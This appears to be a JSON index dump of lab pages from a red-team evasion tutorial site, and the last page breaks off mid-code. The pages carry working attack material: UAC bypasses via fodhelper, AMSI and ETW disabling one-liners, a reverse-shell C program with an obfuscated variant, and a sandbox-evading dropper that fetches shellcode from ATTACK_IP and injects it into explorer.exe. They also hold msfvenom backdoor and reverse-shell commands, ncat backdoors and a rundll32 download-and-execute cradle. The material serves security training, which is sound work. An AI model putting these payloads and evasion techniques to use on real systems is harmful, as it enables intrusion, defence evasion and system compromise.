    "c": "Automated exploitation  An excellent tool is available to test for UAC bypasses without writing your exploits from scratch. Created by @hfiref0x, UACME provides an up-to-date repository of UAC bypass techniques that can be used out of the box. Akagi runs the actual UAC bypasses. Using it is straightforward and only requires indicating the number corresponding to the method to be tested. Method Id Bypass technique 33 fodhelper.exe 34 DiskCleanup scheduled task 70 fodhelper.exe using CurVer registry key A complete list of methods is available on the project’s GitHub description. Using it is simple. To test for method 33 for example, from a command prompt: C:\\tools>UACME-Akagi64.exe 33 A high integrity cmd.exe will pop up.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "2ffec7d2ab8119520e87c33798520d11",
    "u": "https://evasion.tymyrddin.dev/docs/signature/challenge",
    "t": "Real world challenge ",
    "c": "Real world challenge  No one method will be 100% effective or reliable. To create a more effective and reliable methodology, combine the methods. When determining in what order to begin obfuscation, consider the impact of each method. For example, is it easier to obfuscate an already broken class or is it easier to break a class that is obfuscated? In general, run automated obfuscation or less specific obfuscation methods after specific signature breaking. Lab  #include <winsock2.h> #include <windows.h> #include <ws2tcpip.h> #include <stdio.h> #define DEFAULT_BUFLEN 1024 void RunShell(char* C2Server, int C2Port) { SOCKET mySocket; struct sockaddr_in addr; WSADATA version; WSAStartup(MAKEWORD(2,2), &version); mySocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0); addr.sin_family = AF_INET; addr.sin_addr.s_addr = inet_addr(C2Server); addr.sin_port = htons(C2Port); if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) { closesocket(mySocket); WSACleanup(); } else { printf(\"Connected to %s:%d\\\\n\", C2Server, C2Port); char Process[] = \"cmd.exe\"; STARTUPINFO sinfo; PROCESS_INFORMATION pinfo; memset(&sinfo, 0, sizeof(sinfo)); sinfo.cb = sizeof(sinfo); sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW); sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket; CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo); printf(\"Process Created %lu\\\\n\", pinfo.dwProcessId); WaitForSingleObject(pinfo.hProcess, INFINITE); CloseHandle(pinfo.hProcess); CloseHandle(pinfo.hThread); } } int main(int argc, char **argv) { if (argc == 3) { int port = atoi(argv[2]); RunShell(argv[1], port); } else { char host[] = \"10.10.10.10\"; int port = 53; RunShell(host, port); } return 0; } Modify the binary to meet these specifications: No suspicious library calls present No leaked function or variable names File hash is different from the original hash Binary bypasses common anti-virus engines It is also essential to change the C2Server and C2Port variables in the provided payload or this challenge will not properly work, and you will not receive a shell back. Obfuscation order  Rewrite int WSAAPI WSAConnect to meet the requirements of a structure definition. Import the LoadLibraryW library the calls are stored in. Obtain the pointer to the address. Change all occurrences of the API call with the new pointer. Define all pointer addresses needed, corresponding to the structures. The structure definitions outside any function at the beginning of the code. The pointer definitions at the top of the RunShell function Obfuscated code  #include <winsock2.h> #include <windows.h> #include <ws2tcpip.h> #include <stdio.h> #define DEFAULT_BUFLEN 1024 typedef int(WSAAPI* WSASTARTUP)(WORD wVersionRequested,LPWSADATA lpWSAData); typedef SOCKET(WSAAPI* WSASOCKETA)(int af,int type,int protocol,LPWSAPROTOCOL_INFOA lpProtocolInfo,GROUP g,DWORD dwFlags); typedef unsigned(WSAAPI* INET_ADDR)(const char *cp); typedef u_short(WSAAPI* HTONS)(u_short hostshort); typedef int(WSAAPI* WSACONNECT)(SOCKET s,const struct sockaddr *name,int namelen,LPWSABUF lpCallerData,LPWSABUF lpCalleeData,LPQOS lpSQOS,LPQOS lpGQOS); typedef int(WSAAPI* CLOSESOCKET)(SOCKET s); typedef int(WSAAPI* WSACLEANUP)(void); void Run(char* Server, int Port) { HMODULE hws2_32 = LoadLibraryW(L\"ws2_32\"); WSASTARTUP myWSAStartup = (WSASTARTUP) GetProcAddress(hws2_32, \"WSAStartup\"); WSASOCKETA myWSASocketA = (WSASOCKETA) GetProcAddress(hws2_32, \"WSASocketA\"); INET_ADDR myinet_addr = (INET_ADDR) GetProcAddress(hws2_32, \"inet_addr\"); HTONS myhtons = (HTONS) GetProcAddress(hws2_32, \"htons\"); WSACONNECT myWSAConnect = (WSACONNECT) GetProcAddress(hws2_32, \"WSAConnect\"); CLOSESOCKET myclosesocket = (CLOSESOCKET) GetProcAddress(hws2_32, \"closesocket\"); WSACLEANUP myWSACleanup = (WSACLEANUP) GetProcAddress(hws2_32, \"WSACleanup\"); SOCKET s12; struct sockaddr_in addr; WSADATA version; myWSAStartup(MAKEWORD(2,2), &version); s12 = myWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0); addr.sin_family = AF_INET; addr.sin_addr.s_addr = myinet_addr(Server); addr.sin_port = myhtons(Port); if (myWSAConnect(s12, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) { myclosesocket(s12); myWSACleanup(); } else { char P1[] = \"cm\"; char P2[] = \"d.exe\"; char* P = strcat(P1, P2); STARTUPINFO sinfo; PROCESS_INFORMATION pinfo; memset(&sinfo, 0, sizeof(sinfo)); sinfo.cb = sizeof(sinfo); sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW); sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) s12; CreateProcess(NULL, P, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo); WaitForSingleObject(pinfo.hProcess, INFINITE); CloseHandle(pinfo.hProcess); CloseHandle(pinfo.hThread); } } int main(int argc, char **argv) { if (argc == 3) { int port = atoi(argv[2]); Run(argv[1], port); } else { char host[] = \"10.10.50.26\"; int port = 1234; Run(host, port); } return 0; } Compile the binary using mingw-gcc . x86_64-w64-mingw32-gcc challenge.c -o challenge.exe -lwsock32 -lws2_32 Start a listener. Receive shell. Flag is on Administrator’s Desktop.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "500d368f68539d44c44e9b9f716ae667",
    "u": "https://evasion.tymyrddin.dev/docs/netsec/readme",
    "t": "Introduction ",
    "c": "Introduction  THM Room: Network Security Solutions What?  Learn about and experiment with packet fragmentation, source routing, source port manipulation, IP address decoys, IP Address spoofing, customising packets, randomising the order of hosts, proxy servers, sending bad checksums, and anonymisers, on various IDS/IPS systems. Why?  To be able to apply IDS/IPS evasion techniques, such as protocol and payload manipulation. How?  IDS/IPS systems Evasion via protocol manipulation Evasion via payload manipulation Evasion via route manipulation Evasion via tactical DoS C2 and IDS/IPS evasion Next-Generation security",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "9b4bffb4297bdde826284f4f802cc5ef",
    "u": "https://evasion.tymyrddin.dev/docs/runtime/reflection",
    "t": "PowerShell reflection ",
    "c": "PowerShell reflection  Reflection allows a user or administrator to access and interact with .NET assemblies. From the Microsoft docs, “Assemblies form the fundamental units of deployment, version control, reuse, activation scoping, and security permissions for .NET-based applications.” .NET assemblies may seem foreign; however, we can make them more familiar by knowing they take shape in familiar formats such as exe and dll . PowerShell reflection can be abused to modify and identify information from valuable DLLs. Matt Graeber published a one-liner to use Reflection to modify and bypass the AMSI utility: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) Broken down, all the reflection function and specify it wants to use an assembly from [Ref.Assembly] it will then obtain the type of the AMSI utility using GetType . [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') The information collected from the previous section will be forwarded to the next function to obtain a specified field within the assembly using GetField . .GetField('amsiInitFailed','NonPublic,Static') The assembly and field information will then be forwarded to the next parameter to set the value from $false to $true using SetValue . .SetValue($null,$true) Once the amsiInitFailed field is set to $true , AMSI will respond with the response code: AMSI_RESULT_NOT_DETECTED = 1",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "beed6687e5c431a4435122d02aea1aac",
    "u": "https://evasion.tymyrddin.dev/docs/uac/fodhelper",
    "t": "Fodhelper-curver exploit ",
    "c": "Fodhelper-curver exploit  Now Defender is enabled and it detects the fodhelper exploit attempt . A variation on the fodhelper exploit was proposed by V3ded , where different registry keys are used, but the basic principle is the same. Instead of writing the payload into HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command , use the CurVer entry under a progID registry key. This entry is used when you have multiple instances of an application with different versions running on the same system. CurVer allows for pointing to the default version of the application to be used by Windows when opening a given file type. Create an entry on the registry for a new progID (any name will do) and then point the CurVer entry in the ms-settings progID to the newly created progID . This way, when fodhelper tries opening a file using the ms-settings progID , it will notice the CurVer entry pointing to the new progID and check it to see what command to use. The exploit code proposed by @V3ded uses Powershell to achieve this end. A modified version of it, adapted for using reverse shell: $program = \"powershell -windowstyle hidden C:\\tools\\socat\\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes\" New-Item \"HKCU:\\Software\\Classes\\.pwn\\Shell\\Open\\command\" -Force Set-ItemProperty \"HKCU:\\Software\\Classes\\.pwn\\Shell\\Open\\command\" -Name \"(default)\" -Value $program -Force New-Item -Path \"HKCU:\\Software\\Classes\\ms-settings\\CurVer\" -Force Set-ItemProperty \"HKCU:\\Software\\Classes\\ms-settings\\CurVer\" -Name \"(default)\" -value \".pwn\" -Force Start-Process \"C:\\Windows\\System32\\fodhelper.exe\" -WindowStyle Hidden This exploit creates a new progID with the name .pwn and associates the payload to the command used when opening such files and points the CurVer entry of ms-settings to the .pwn progID . When fodhelper tries opening an ms-settings program, it will instead be pointed to the .pwn progID and use its associated command. This technique is more likely to evade Windows Defender because we have more liberty on where to put the payload, as the name of the progID that holds our payload is entirely arbitrary. Lab  Start a new reverse shell on the attacker machine: nc -lvp 4445 And execute the exploit from the backdoor connection. Windows Defender will throw another fit that references the actions taken. The detection methods used by AV software are implemented strictly against the published exploit, without considering possible variations. If we translate our exploit from Powershell to use cmd.exe , the AV won’t raise any alerts. C:\\> set CMD=\"powershell -windowstyle hidden C:\\Tools\\socat\\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes\" C:\\> reg add \"HKCU\\Software\\Classes\\.thm\\Shell\\Open\\command\" /d %CMD% /f The operation completed successfully. C:\\> reg add \"HKCU\\Software\\Classes\\ms-settings\\CurVer\" /d \".thm\" /f The operation completed successfully. C:\\> fodhelper.exe In the high integrity reverse shell, get the flag: $ nc -lvp 4445 Listening on 0.0.0.0 4445 Connection received on 10.10.183.127 23441 Microsoft Windows [Version 10.0.17763.1821] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32>whoami /groups | find \"Label\" Mandatory Label\\High Mandatory Level Label S-1-16-12288 C:\\> C:\\flags\\GetFlag-fodhelper-curver.exe Clear tracks: reg delete \"HKCU\\Software\\Classes\\.thm\\\" /f reg delete \"HKCU\\Software\\Classes\\ms-settings\\\" /f",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "75fa4e638a0a14f5b0730ddaf6f8de89",
    "u": "https://evasion.tymyrddin.dev/docs/etw/ps-reflection",
    "t": "Powershell reflection ",
    "c": "Powershell reflection  In the context of ETW, an attacker can reflect the ETW event provider assembly and set the m_enabled field to $null . At a high level, PowerShell reflection can be broken up into four steps: Obtain .NET assembly for PSEtwLogProvider . Store a null value for etwProvider field. Set the field for m_enabled to previously stored value. Code  Obtain the type for the PSEtwLogProvider assembly and store it to access its internal fields in the next step: $logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider') Store a value ($null) from the previous assembly: $etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null) Compile the steps together to overwrite the m_enabled field with the stored value: [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0); Compiled together, these steps can be appended to make a malicious PowerShell script.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "1c53001a4de0f1acbf9137ddafe7cd32",
    "u": "https://evasion.tymyrddin.dev/docs/netsec/route",
    "t": "Evasion via route manipulation ",
    "c": "Evasion via route manipulation  Evasion via route manipulation includes: Relying on source routing Using proxy servers Relying on source routing  Source routing can be used to force the packets to use a certain route to reach their destination. Nmap provides this feature using the option --ip-options . Nmap offers loose and strict routing: Loose routing can be specified using L . For example, --ip-options \"L 10.10.10.50 10.10.50.250\" requests that scan packets are routed through the two provided IP addresses. Strict routing can be specified using S . Strict routing requires setting every hop between the originating system and the target host. For example, --ip-options \"S 10.10.10.1 10.10.20.2 10.10.30.3\" specifies that the packets go via these three hops before reaching the target host. Using proxy servers  The use of proxy servers can help hide the source machine. Nmap offers the option --proxies that takes a comma-separated list of proxy URLs. Each URL must be expressed in the format proto://host:port . Valid protocols are HTTP and SOCKS4 . Authentication is not currently supported. As an example, instead of running nmap -sS MACHINE_IP , edit the Nmap command to something like: nmap -sS HTTP://PROXY_HOST1:8080,SOCKS4://PROXY_HOST2:4153 MACHINE_IP This way, the scan goes through HTTP proxy host1, then SOCKS4 proxy host2, before reaching the target. Using a browser to connect to the target, it would be simple to pass the traffic via a proxy server. Other network tools provide their own proxy settings that can be used to hide the traffic source. Proxy chaining is also an option that helps an attacker to maintain their Internet Anonymity. Some examples of proxy tools are Proxy Switcher, CyberGhost VPN, Tor, CCProxy, Hotspot Shield, etc. Resources  Penetration testing: TOR, VPN or proxy",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "955143331e9d6a241b9d3467c04349be",
    "u": "https://evasion.tymyrddin.dev/docs/sandbox/escape",
    "t": "The Great Escape ",
    "c": "The Great Escape  Create your own Sandbox Evasion executable. In order to escape the Sandbox, you must implement the following techniques: Check and see if the device is joined to an Active Directory Domain Check if the system memory is greater than 1GB of RAM Implement an outbound HTTP request to 10.10.10.10 Implement a 60-second sleep timer before your payload is retrieved from your web server If your dropper meets these requirements specified above, the flag will be printed out to you. The Sandbox Evasion Techniques can fail. The program analyzes the binary to see if the checks are implemented. The outbound device may not have internet access - as long as the checks are implemented, the sandbox check should succeed. If you have done it right, the “Sleep Check” will take approximately one minute to reveal the flag. If your DNS check has if(dcNewName.find(\"\\\\\")) instead of if(dcNewName.find(\"\\\\\\\\\")) then you may have difficulties with the sleep check. Code  To use this code in the THM context for your machines, change the placeholder values explorer.exe-pid and ATTACK_IP . #include <iostream> #include <Windows.h> #include <tlhelp32.h> #include <locale> #include <string> #include <urlmon.h> #include <cstdio> #pragma comment(lib, \"urlmon.lib\") #include <lm.h> #pragma comment(lib, \"netapi32.lib\") using namespace std; BOOL isDomainController() { LPCWSTR dcName; string dcNameComp; NetGetDCName(NULL, NULL, (LPBYTE*)&dcName); wstring ws(dcName); string dcNewName(ws.begin(), ws.end()); cout << dcNewName; if(dcNewName.find(\"\\\\\\\\\")) { return FALSE; } else { return TRUE; } } BOOL checkIP() { const char* websiteURL = \"https://10.10.10.10\"; IStream* stream; string s; char buff[35]; unsigned long bytesRead; URLOpenBlockingStreamA(0, websiteURL, &stream, 0, 0); while (true) { stream->Read(buff, 35, &bytesRead); if (0U == bytesRead) { break; } s.append(buff, bytesRead); } if (s == \"VICTIM_IP\") { return TRUE; } else { return FALSE; } } BOOL memoryCheck() { MEMORYSTATUSEX statex; statex.dwLength = sizeof(statex); GlobalMemoryStatusEx(&statex); if (statex.ullTotalPhys / 1024 / 1024 / 1024 >= 1.00) { return TRUE; } else { return FALSE; } } int downloadAndExecute() { HANDLE hProcess; //Update the dwSize variable with your shellcode size. This should be approximately 510 bytes SIZE_T dwSize = 510; DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE; DWORD flProtect = PAGE_EXECUTE_READWRITE; LPVOID memAddr; SIZE_T bytesOut; //Update the OpenProcess Windows API with your Explorer.exe Process ID. This can be found in Task Manager hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorer.exe-pid); //Update the c2URL with your IP Address and the specific URI where your raw shellcode is stored. const char* c2URL = \"http://ATTACK_IP:8080/index.raw\"; IStream* stream; //Update the buff[] variable to include your shellcode size char buff[510]; unsigned long bytesRead; string s; URLOpenBlockingStreamA(0, c2URL, &stream, 0, 0); while (true) { //Update the Read file descriptor to include your shellcode size stream->Read(buff, 510, &bytesRead); if (0U == bytesRead) { break; } s.append(buff, bytesRead); } memAddr = VirtualAllocEx(hProcess, NULL, dwSize, flAllocationType, flProtect); WriteProcessMemory(hProcess, memAddr, buff, dwSize, &bytesOut); CreateRemoteThread(hProcess, NULL, dwSize, (LPTHREAD_START_ROUTINE)memAddr, 0, 0, 0); stream->Release(); return 0; } int main() { Sleep(60000); if (isDomainController() == TRUE) { if (memoryCheck() == TRUE) { if (checkIP() == TRUE) { downloadAndExecute(); } } } return 0; } Check: C:\\Users\\Administrator\\Desktop\\Materials\\> .\\SandboxChecker.exe C:\\Users\\TryHackMe\\Materials\\SandboxEvasion.exe [+] Memory Check found! [+] Network Check found! [+] GeoFilter Check found! [+] Sleep Check found! Congratulations! Here is your flag: THM{6c1f95ec}",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "4858b221abfff3fa0d8f6f2c7772ec00",
    "u": "https://evasion.tymyrddin.dev/docs/av/packers",
    "t": "Packers ",
    "c": "Packers  Packers are pieces of software that take a program as input and transform it so that its structure looks different, but their functionality remains exactly the same. Packers do this with two main goals in mind: Compress the program so that it takes up less space. Protect the program from reverse engineering in general. Packers can also obfuscate malware without much effort. There are quite a large number of packers, including UPX, MPRESS, Themida, and many others. If an AV is catching a reverse shell executable as malicious because it matches a known signature, using a packer will transform the reverse shell executable so that it does not match any known signatures while on disk. As a result, you should be able to distribute your payload to any machine’s disk without much problem. Some AV solutions could still catch the packed application: While the original code might be transformed into something unrecognisable,the packed executable contains a stub with the unpacker’s code. If the unpacker has a known signature, AV solutions might still flag any packed executable based on the unpacker stub alone. At some point, the application will unpack the original code into memory so that it can be executed. If the AV solution can do in-memory scans, it might still be detected after the code is unpacked. Packing  UnEncStagelessPayload.cs : using System; using System.Net; using System.Text; using System.Configuration.Install; using System.Runtime.InteropServices; using System.Security.Cryptography.X509Certificates; public class Program { [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; public static void Main() { byte[] shellcode = new byte[] {0xfc,0x48,0x83,...,0xda,0xff,0xd5 }; UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length); IntPtr threadHandle = IntPtr.Zero; UInt32 threadId = 0; IntPtr parameter = IntPtr.Zero; threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId); WaitForSingleObject(threadHandle, 0xFFFFFFFF); } } Generate a new shellcode and put it into the shellcode variable of the code: C:\\> msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7478 -f csharp Compile the payload in the Windows machine: C:\\> csc UnEncStagelessPayload.cs Use the ConfuserEx packer: Select the desktop as the base directory, then drag and drop the executable on the interface. Go to the settings tab and select the payload. Click the “+” button to add settings to the payload. This creates a rule named “true”. Enable compression. Edit the “true” rule and set it to the Maximum preset. Go to the “Protect!” tab and click “Protect”. set up an nc listener on the attack machine. Execute the payload. Works! But … when running a command on the reverse shell, the AV notices it and kills it. Windows Defender will hook certain Windows API calls and do in-memory scanning whenever such API calls are used. In the case of any shell generated with msfvenom, CreateProcess() will be invoked and detected. Now what?  Just wait a bit. Try spawning the reverse shell again and wait for around 5 minutes before sending any command. You’ll see the AV won’t complain anymore. The reason for this is that scanning memory is an expensive operation. Therefore, the AV will do it for a while after your process starts but will eventually stop. Use smaller payloads. The smaller the payload, the less likely it is to be detected. If you use msfvenom to get a single command executed instead of a reverse shell, the AV will have a harder time detecting it. You can try with msfvenom -a x64 -p windows/x64/exec CMD='net user pwnd Password321 /add;net localgroup administrators pwnd /add' -f csharp",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "d2b11fc9a6a00586e970d5bb49bc53b7",
    "u": "https://evasion.tymyrddin.dev/docs/etw/pipeline",
    "t": "Abusing log pipeline ",
    "c": "Abusing log pipeline  Within PowerShell, each module or snap-in has a setting that anyone can use to modify its logging functionality. An attacker can change this value to $false in any PowerShell session to disable a module logging for that specific session. The Microsoft docs even note the ability to disable logging from a user session: “To disable logging, use the same command sequence to set the property value to FALSE ($false).” At a high-level the log pipeline technique can be broken up into four steps: Obtain the target module. Set module execution details to $false . Obtain the module snap-in. Set snap-in execution details to $false . Code  $module = Get-Module Microsoft.PowerShell.Utility # Get target module $module.LogPipelineExecutionDetails = $false # Set module execution details to false $snap = Get-PSSnapin Microsoft.PowerShell.Core # Get target ps-snapin $snap.LogPipelineExecutionDetails = $false # Set ps-snapin execution details to false Append to any PowerShell script or run in a session to disable module logging of currently imported modules.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "a78e68c31737644bccf8181bc93708c8",
    "u": "https://evasion.tymyrddin.dev/docs/firewalls/hopping",
    "t": "Evasion using port hopping ",
    "c": "Evasion using port hopping  Port hopping is a technique where an application hops from one port to another till it can establish and maintain a connection. In other words, the application might try different ports till it can successfully establish a connection. Some “legitimate” applications use this technique to evade firewalls. There is another type of port hopping where the application establishes the connection on one port and starts transmitting some data; after a while, it establishes a new connection on (hops to) a different port and resumes sending more data. The purpose is to make it more difficult for the blue team to detect and track all the exchanged traffic. Set up a listener on the attack machine: $ ncat -lvnp 1025 Then exploit a vulnerable service that allows remote code execution (RCE) or a misconfigured system to execute some code with a command. As command use Netcat to connect to the target port using the command ncat IP_ADDRESS PORT_NUMBER . For example, run ncat ATTACK_IP 1024 to connect to the attacker machine at TCP port 1025 . Then try another port: Change the listener and the command to match.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "91ae967aef864539e5523208bbe420d3",
    "u": "https://evasion.tymyrddin.dev/docs/av/binders",
    "t": "Binders ",
    "c": "Binders  A binder is a program that merges two (or more) executables into a single one. It is often used when to distribute a payload hidden inside another known program to fool users into believing they are executing a different program. You can easily plant a payload of your preference in any .exe file with msfvenom. The binary will still work as usual but execute an additional payload silently. The method used by msfvenom injects the malicious program by creating an extra thread for it. Having a separate thread is even better, since your program won’t get blocked in case the shellcode fails for some reason. To create a backdoored WinSCP.exe : C:\\> msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7779 -f exe -o WinSCP-evil.exe Set up a listener: $ nc -lvp 7779 Binders and AV  Binders won’t do much to hide a payload from an AV solution. The simple fact of joining two executables without any changes means that the resulting executable will still trigger any signature that the original payload did. The main use of binders is to fool users into believing they are executing a legitimate executable rather than a malicious payload.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "9244e6e3b19921060fc8f90ed661e9b1",
    "u": "https://evasion.tymyrddin.dev/docs/firewalls/non-standard-ports",
    "t": "Evasion using non-standard ports ",
    "c": "Evasion using non-standard ports  To create a backdoor via the specified port number that lets you interact with the Bash shell: ncat -lvnp PORT_NUMBER -e /bin/bash Considering the case that we have a firewall, it is not enough to use ncat to create a backdoor unless we can connect to the listening port number. And unless we run ncat as a privileged user, root, or using sudo, we cannot use port numbers below 1024. Lab  Use the vulnerable web-form to set up an ncat listener. Knowing that the firewall does not block packets to destination port 8081 , use ncat to listen for incoming connections and execute Bash shell. Connect to the shell from the attack machine. What is the username associated with which you are logged in? On Target ( http://TARGET_IP:8080 ), run an ncat listener: ncat -lvnp 8081 -e /bin/bash Then on the attacker machine connected to THM VPN, connect through nc : nc TARGET_IP 8081 Ask whoami .",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "928728b08b4c15a316d4b57173fbae4e",
    "u": "https://evasion.tymyrddin.dev/docs/land/execution",
    "t": "File execution ",
    "c": "File execution  File Explorer  File Explorer is a pre-installed file manager and system component for Windows. People found that using the file explorer binary can execute other .exe files. This technique is called Indirect Command Execution, where the explorer.exe tool can be used and abused to launch malicious scripts or executables from a trusted parent process. The explorer.exe binary is located at: C:\\Windows\\explorer.exe for the Windows 32 bits version C:\\Windows\\SysWOW64\\explorer.exe for the Windows 64 bits version In order to create a child process of explorer.exe parent (in this case calc.exe ): explorer.exe /root,\"C:\\Windows\\System32\\calc.exe\" WMIC  WMIC Windows Management Instrumentation (WMIC) is a Windows command-line utility that manages Windows components. People found that WMIC is also used to execute binaries for evading defensive measures. The MITRE ATT&CK framework refers to this technique as Signed Binary Proxy Execution ( T1218 ) To create a new process of a binary of our choice (in this case calc.exe again): wmic.exe process call create calc Rundll32  Rundll32 is a pre-installed tool on Windows that loads and runs Dynamic Link Library DLL files within the OS. A red team can abuse and leverage rundll32.exe to run arbitrary payloads and execute JavaScript and PowerShell scripts. The MITRE ATT&CK framework identifies this as “Signed Binary Proxy Execution: Rundll32” ( T1218 ). The rundll32.exe binary is located at: C:\\Windows\\System32\\rundll32.exe for the Windows 32 bits version C:\\Windows\\SysWOW64\\rundll32.exe for the Windows 64 bits version To execute a calc.exe binary as proof of concept using the rundll32.exe binary: rundll32.exe javascript:\"\\..\\mshtml.dll,RunHTMLApplication \";eval(\"w=new ActiveXObject(\\\"WScript.Shell\\\");w.run(\\\"calc\\\");window.close()\"); To run a JavaScript that executes a PowerShell script to download from a remote website using rundll32.exe : rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');\");",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "b0c7bd77175a22d9844cf8ab3cb83a82",
    "u": "https://evasion.tymyrddin.dev/docs/sandbox/implementation",
    "t": "Implementing evasion techniques ",
    "c": "Implementing evasion techniques  Taking a Nap  Take the template code from Common sandbox evasion techniques and add a Sleep statement for 120,000ms to it. This translates to roughly 120 seconds or 2 minutes. Generally, you would want a time closer to 5 minutes to be sure; but 2 minutes will suffice for testing purposes: int main() { Sleep(120000); downloadAndExecute(); return 0; } Compile and upload the code to Any.Run : Sleep Bypass No Sleep Bypass A simple technique, incredibly powerful and has allowed us to run out Any.Run’s one-minute timer. This method may or may not work due to various blog posts that have been published showing how Blue Teamers can create sleep timer bypasses. A better implementation could be to waste computing time by doing heavy math. Geolocation Filtering  Leveraging Geolocation blocks. Fortunately, there is a good amount of code that is already written for us. Portions of the downloadAndExecute() function can be re-used for this: Website URL (formerly the c2URL variable) Internet Stream (formerly the stream variable) String variable (formerly the s variable) Buffer Space (formerly the Buff variable) Bytes Read (formerly the unsigned long bytesRead variable) Lastly, the URLOpenBlockingStreamA function BOOL checkIP() { // Declare the Website URL that we would like to vicit const char* websiteURL = \"<https://ifconfig.me/ip>\"; // Create an Internet Stream to access the website IStream* stream; // Create a string variable where we will store the string data received from the website string s; // Create a space in memory where we will store our IP Address char buff[35]; unsigned long bytesRead; // Open an Internet stream to the remote website URLOpenBlockingStreamA(0, websiteURL, &stream, 0, 0); // While data is being sent from the webserver, write it to memory while (true) { stream->Read(buff, 35, &bytesRead); if (0U == bytesRead) { break; } s.append(buff, bytesRead); } // Compare if the string is equal to the targeted victim's IP. If true, return the check is successful. Else, fail the check. if (s == \"VICTIM_IP\") { return TRUE; } else { return FALSE; } } Modify main : int main(){ if(checkIP() == TRUE){ downloadAndExecute(); return 0; } else { cout << \"HTTP/418 - I'm a Teapot!\"; return 0; } } Compile and upload the code to Any.Run : with an IP Address Filter without an IP Address Filter ifconfig.me is flagged as a questionable/Potentially Malicious site used to check for your external IP Address. This Sandbox evasion method ended up hurting our score, so it should be used as a last resort or with a recently deployed/custom IP Address checking server. Checking system information  Start off the System Information category with - the amount of RAM a system has. It is important to note that Windows measures data in a non-standard format. If you have ever bought a computer that said it has “256GB of SSD Storage”, after turning it on, you would have closer to 240GB. This is because Windows measures data in units of 1024-bytes instead of 1000-bytes. This can get confusing very quickly. Fortunately for us, we will be working in such small amounts of memory that accuracy can be a best guess instead of an exact number. Now that we know this, how can we determine how much memory is installed on the System? We only need the Windows header file included, and we can call a specific Windows API, GlobalMemoryStatusEx , to retrieve the data: Declare the MEMORYSTATUSEX struct Set the size of the dwLength member to the size of the struct Call the GlobalMemoryStatusEx Windows API to populate the struct with the memory information We want the total amount of physical memory installed on the system, so we will print out the ullTotalPhys member of the MEMORYSTATUSEX struct to get the size of the memory installed in the system in Bytes. Divide by 1024 3x to get the value of memory installed in GiB. In C++: #include <iostream> #include <Windows.h> using namespace std; int main() { // Declare the MEMORYSTATUSEX Struct MEMORYSTATUSEX statex; // Set the length of the struct to the size of the struct statex.dwLength = sizeof(statex); // Invoke the GlobalMemoryStatusEx Windows API to get the current memory info GlobalMemoryStatusEx(&statex); // Print the physical memory installed on the system cout << \"There is \" << statex.ullTotalPhys/1024/1024/1024 << \"GiB of memory on the system.\"; } Most Sandboxes have 4GB of RAM dedicated to the machine, so we should check and see if the memory count is greater than 5; if it is not, exit the program; if it is, continue execution. BOOL memoryCheck() { // This function will check and see if the system has 5+GB of RAM // Declare the MEMORYSTATUSEX Struct MEMORYSTATUSEX statex; // Set the length of the struct to the size of the struct statex.dwLength = sizeof(statex); // Invoke the GlobalMemoryStatusEx Windows API to get the current memory info GlobalMemoryStatusEx(&statex); // Checks if the 